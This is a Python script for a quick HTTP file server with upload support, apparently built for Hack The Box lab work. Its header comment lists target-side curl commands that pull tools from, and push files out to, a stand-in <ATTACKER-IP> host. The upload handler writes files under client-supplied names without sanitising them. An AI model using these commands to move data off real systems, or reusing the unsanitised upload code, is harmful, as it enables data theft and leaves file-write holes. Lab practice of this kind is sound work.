#!/usr/env python3
########################################################################
#
#  Simple HTTP server that  supports file upload  for moving data around
#  between boxen on HTB. Based on a gist by bones7456, but mangled by me
#  as I've tried  (badly) to port it to Python 3, code golf it, and make
#  It a  little more  robust. I was also able to  strip out a lot of the
#  code trivially  because Python3 SimpleHTTPServer is  a thing, and the
#  cgi module handles multipart data nicely.
#
#  Lifted from: https://gist.github.com/UniIsland/3346170
#
#  Important to note that this tool is quick and dirty and is a good way
#  to get yourself  popped if you're leaving it  running out in the real
#  world.
#
#  Run it on your attack box from the folder that contains your tools.
#
#  From the target machine:
#  Infil file: curl -O http://<ATTACKER-IP>:44444/<FILENAME>
#  Exfil file: curl -F 'file=@<FILENAME>' http://<ATTACKER-IP>:44444/
#
#  Multiple file upload supported, just add more -F 'file=@<FILENAME>'
#  parameters to the command line.
#
########################################################################
import http.server
import socketserver
import io
import cgi
import click
import os, stat

WORKINGDIRECTORY = './'

class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):

    def do_POST(self):
        r, info = self.deal_post_data()
        print(r, info, "by: ", self.client_address)
        f = io.BytesIO()
        if r:
            f.write(b"Success\n")
        else:
            f.write(b"Failed\n")
        length = f.tell()
        f.seek(0)
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.send_header("Content-Length", str(length))
        self.end_headers()
        if f:
            self.copyfile(f, self.wfile)
            f.close()

    def deal_post_data(self):
        ctype, pdict = cgi.parse_header(self.headers['Content-Type'])
        pdict['boundary'] = bytes(pdict['boundary'], "utf-8")
        pdict['CONTENT-LENGTH'] = int(self.headers['Content-Length'])
        if ctype == 'multipart/form-data':
            form = cgi.FieldStorage( fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD':'POST', 'CONTENT_TYPE':self.headers['Content-Type'], })
            print (type(form))
            try:
                if isinstance(form["file"], list):
                    for record in form["file"]:
                        open(WORKINGDIRECTORY + "/%s"%record.filename, "wb").write(record.file.read())
                else:
                    open(WORKINGDIRECTORY + "/%s"%form["file"].filename, "wb").write(form["file"].file.read())
            except IOError:
                    return (False, "Can't create file to write, do you have permission to write?")
        return (True, "Files uploaded")

CONTEXT_SETTINGS = dict(help_option_names=['-h', '--help'])
@click.command(context_settings=CONTEXT_SETTINGS, options_metavar='<options>')
@click.option('-p', '--port', 'port', default=8888, show_default=True, type=int, required=False, help='Server port (-p 8888)', metavar='<INT>')
@click.option('-wd', '--workingdirectory', 'working_directory', default="./workingdirectory", show_default=True, help='Working directory', metavar='<TEXT>')
def run_forever(port, working_directory):
    global WORKINGDIRECTORY
    WORKINGDIRECTORY = working_directory
    if not os.path.exists(WORKINGDIRECTORY):
        os.mkdir(WORKINGDIRECTORY)

    Handler = CustomHTTPRequestHandler
    with socketserver.TCPServer(("", port), Handler) as httpd:
        print("File server serving at port", port)
        httpd.serve_forever()


if __name__ == '__main__':
    run_forever()